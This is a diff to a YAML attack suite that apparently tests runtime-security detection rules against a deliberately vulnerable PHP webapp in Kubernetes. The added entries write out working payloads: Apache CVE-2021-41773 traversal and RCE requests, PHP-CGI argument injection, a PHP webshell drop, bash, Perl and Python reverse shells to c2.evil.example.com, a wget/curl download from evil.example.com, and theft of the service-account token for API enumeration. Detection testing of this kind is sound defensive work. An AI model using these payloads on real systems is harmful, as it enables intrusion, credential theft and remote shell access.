@@ -3,11 +3,11 @@ kind: AttackSuite
 metadata:
   name: webapp-killchain-attacks
   description: >-
-    Kill-chain ordered PHP webapp attack suite (20 attacks) exploiting command
-    injection in ping.php. Covers MITRE ATT&CK for Containers phases from
-    Reconnaissance through Impact. Maps to OWASP A03 (Injection), A05
-    (Misconfiguration), A07 (Auth Failures), A10 (SSRF). All HTTP attacks
-    route through the K8s API service proxy.
+    Kill-chain ordered PHP webapp attack suite (31 attacks) exploiting command
+    injection in ping.php. Includes CVE-based exploits: CVE-2021-41773,
+    CVE-2012-1823/CVE-2024-4577. Covers MITRE ATT&CK for Containers phases
+    from Reconnaissance through Impact. Maps to OWASP A03 (Injection), A05
+    (Misconfiguration), A07 (Auth Failures), A10 (SSRF).
 target:
   service: webapp-mywebapp
   namespace: webapp
@@ -334,3 +334,183 @@ attacks:
       - ruleID: R1008
         ruleName: Crypto Mining Domain Communication
         containerName: mywebapp-app
+
+  # ═══════════════════════════════════════════════════════════════════════════
+  # CVE-BASED ATTACKS — Historical PHP/Apache/webapp vulnerabilities
+  # ═══════════════════════════════════════════════════════════════════════════
+
+  # CVE-2021-41773 / CVE-2021-42013 — Apache path traversal RCE
+  # Severity: Critical (CVSS 9.8). Path normalization flaw in Apache 2.4.49/50
+  # allows reading files and RCE via mod_cgi. Mass-exploited in the wild.
+  - name: cve-2021-41773-path-traversal
+    type: cmdinject
+    http:
+      method: GET
+      path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
+    successIndicators:
+      - bodyContains: "root:"
+      - statusCode: 403
+      - statusCode: 404
+    expectedDetections: []
+
+  # CVE-2021-41773 — RCE variant via mod_cgi
+  - name: cve-2021-41773-rce
+    type: cmdinject
+    http:
+      method: POST
+      path: /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh
+      headers:
+        Content-Type: text/plain
+      body: "echo; id"
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 403
+      - statusCode: 404
+    expectedDetections: []
+
+  # CVE-2012-1823 / CVE-2024-4577 — PHP-CGI argument injection
+  # Severity: Critical (CVSS 9.8). PHP-CGI passes query string as args,
+  # allowing -d flags to enable code execution. CVE-2024-4577 bypasses
+  # the original fix on Windows but technique is universal for testing.
+  - name: cve-2012-1823-php-cgi-injection
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+    successIndicators:
+      - statusCode: 200
+      - statusCode: 400
+    expectedDetections: []
+
+  # T1059.004 — Webshell drop attempt via command injection
+  # Classic post-exploitation: write a PHP webshell for persistent access.
+  - name: cmdinject-webshell-drop
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;echo '<?php system($_GET[c]); ?>' > /tmp/shell.php 2>/dev/null; echo webshell_written"
+    successIndicators:
+      - bodyContains: "webshell_written"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: echo
+
+  # T1059.004 — Reverse shell attempt (bash /dev/tcp)
+  # Standard CTF/pentest technique. Connection will fail (no listener)
+  # but the process spawn is what matters for detection.
+  - name: cmdinject-reverse-shell
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;bash -c 'bash -i >& /dev/tcp/c2.evil.example.com/4444 0>&1' 2>/dev/null || echo revshell_failed"
+    successIndicators:
+      - bodyContains: "revshell_failed"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: bash
+
+  # T1105 — Download and execute (wget + chmod + exec)
+  # Standard dropper technique used by crypto miners and botnets.
+  - name: cmdinject-download-exec
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;wget -q -O /tmp/payload http://evil.example.com/mal 2>/dev/null || curl -so /tmp/payload http://evil.example.com/mal 2>/dev/null; chmod +x /tmp/payload 2>/dev/null; echo download_attempted"
+    successIndicators:
+      - bodyContains: "download_attempted"
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: wget
+
+  # T1552.001 — PHP filter chain LFI (read source code)
+  # Classic technique to exfiltrate PHP source via base64 encoding.
+  # Even if direct LFI fails, this probes for php:// wrapper support.
+  - name: cmdinject-php-filter-lfi
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;php -r \"echo file_get_contents('php://filter/convert.base64-encode/resource=/etc/passwd');\" 2>/dev/null || echo filter_failed"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: php
+
+  # T1059 — Python reverse shell probe (if python available)
+  - name: cmdinject-python-revshell
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;python3 -c \"import socket,os;s=socket.socket();s.settimeout(2);s.connect(('c2.evil.example.com',4444))\" 2>/dev/null || python -c \"print('python_not_available')\" 2>/dev/null || echo no_python"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections: []
+
+  # T1613 — K8s API enumeration with stolen SA token
+  # After stealing the token (cmdinject-sa-token), use it to enumerate.
+  - name: cmdinject-k8s-enum-pods
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api/v1/namespaces/webapp/pods 2>&1 | head -20 || echo k8s_enum_failed"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: curl
+
+  # T1059.004 — Perl one-liner reverse shell probe
+  - name: cmdinject-perl-revshell
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>4444,Proto=>\"tcp\",Timeout=>2);if($s){print \"connected\"}else{print \"perl_connect_failed\"}' 2>/dev/null || echo no_perl"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: perl
+
+  # T1003 — /proc/self/maps memory layout leak
+  - name: cmdinject-proc-maps
+    type: cmdinject
+    http:
+      method: GET
+      path: /ping.php
+      queryParams:
+        ip: "127.0.0.1;cat /proc/self/maps 2>/dev/null | head -5 || echo no_maps"
+    successIndicators:
+      - statusCode: 200
+    expectedDetections:
+      - ruleID: R0001
+        ruleName: Unexpected process launched
+        containerName: mywebapp-app
+        command: cat
